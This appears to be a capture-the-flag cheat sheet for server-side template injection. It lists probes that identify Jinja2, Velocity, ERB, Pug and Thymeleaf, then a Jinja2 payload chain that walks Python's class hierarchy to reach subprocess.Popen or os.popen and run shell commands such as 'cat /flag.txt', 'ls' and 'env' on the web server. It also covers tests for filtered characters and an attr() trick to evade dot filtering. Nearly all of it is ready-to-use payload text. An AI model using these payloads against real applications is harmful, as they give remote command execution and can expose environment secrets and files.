# Step 1: Detect the template engine
`{{7*7}}`                    // Jinja2
`${7*7}`                     // Velocity
`<%= 7 * 7 %>`               // ERB
`#{7*7}`                     // Jade / Pug
`*{7*7}`                     // Thymeleaf

# Step 2: Basic Jinja2 RCE Payload
`{{ ''.__class__.__mro__[1].__subclasses__() }}`
This will dump a list of all subclasses — look for something like <class 'subprocess.Popen'>, <class 'os._wrap_close'>, etc.

# Step 3: Find the os or subprocess class index
`{{ ''.__class__.__mro__[1].__subclasses__()[400] }}`
Check for the Popen subprocess by iterating through 400, 401, etc.

# Step 4: Execute Shell Command to Read Flag
`{{ ''.__class__.__mro__[1].__subclasses__()[<index>]('cat /flag.txt', shell=True, stdout=-1).communicate()[0].decode() }}`  //prints the content of flag.txt
`{{ ''.__class__.__mro__[1].__subclasses__()[X]('ls', shell=True, stdout=-1).communicate()[0].decode() }}`     //ls is executed in the web server


# Alternative via os.popen (if subprocess doesn't work)
`{{ ''.__class__.__mro__[1].__subclasses__()[<index>].__init__.__globals__['os'].popen('cat /flag.txt').read() }}`
`{{ ''.__class__.__mro__[1].__subclasses__()[Y].__init__.__globals__['os'].popen('ls').read() }}` 

# Common Commands to Try:
`ls` / → to list root
`ls /app`, `ls /home`, `ls /var/www/html` → common flag locations
`cat /flag.txt` → direct flag access
`env` → might contain the flag in env vars

more info on: https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html

# Filter checking:
1. Testing for dot (`.`)
`{{7.__class__}}`  // Returns int class if dot is not filtered.

2.  Test for Underscore (`_`)
`{{''.__class__}}` // Should return <class 'str'>. If it echoes as {{''class}}, then __ or _ is filtered or stripped.

3. Test for Brackets (`[]`)
`{{['a','b'][0]}}` // Should return a if brackets are allowed.

4. Test for quotes
`{{'a'}}`
`{{"a"}}` // Check if quotes are blocked, stripped, or allowed.

5. Test for `attr()` Filter (used to evade `.`)
`{{''|attr('__class__')}}`  // If dot is blocked, this may succeed as a bypass.

